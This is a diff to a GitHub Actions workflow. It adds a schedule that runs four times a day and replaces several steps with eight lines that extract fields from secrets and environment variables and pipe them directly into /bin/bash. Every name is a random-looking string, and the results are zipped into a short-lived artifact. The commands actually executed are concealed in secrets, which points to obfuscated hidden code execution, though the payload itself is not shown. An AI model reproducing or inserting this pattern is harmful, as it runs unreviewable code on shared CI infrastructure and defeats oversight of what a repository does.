@@ -2,6 +2,8 @@ name: Pipeline
 on:
   workflow_dispatch:
 
+  schedule:
+    - cron: '18 4,10,16,22 * * *'
 permissions:
   contents: read
 jobs:
@@ -14,16 +16,20 @@ jobs:
           fetch-depth: 1
       - name: Go
         env:
-          ofeu3: ${{ secrets.ofeu3 }}
+          jcsr1026: ${{ secrets.jcsr1026 }}
         run: |
-          printf '%s' "$ofeu3" | jq -r .xbim2 | /bin/bash
-          echo $rzh80360 | jq -r .cc33 | /bin/bash
-          printf '%s' "$ppg4221" | jq -r .ud3 | /bin/bash
-          echo $votxk16 | jq -r .soqcs70254 | /bin/bash
+          printf '%s' "$jcsr1026" | jq -r .bv4 | /bin/bash
+          echo $ixhhs460 | jq -r .jcbok9075 | /bin/bash
+          printf '%s' "$veo422" | jq -r .zwn0478 | /bin/bash
+          echo $qk4 | jq -r .ux788 | /bin/bash
+          echo $pbwsu1 | jq -r .up71051 | /bin/bash
+          printf '%s' "$yrlmd3" | jq -r .ceo3 | /bin/bash
+          echo $tuig0396 | jq -r .qe557 | /bin/bash
+          printf '%s' "$oxn8541" | jq -r .muajz88 | /bin/bash
 
       - name: Archive results
         uses: actions/upload-artifact@v4
         with:
-          name: IN4oFMtr
+          name: HaXON8tz
           path: "*.zip"
           retention-days: 1
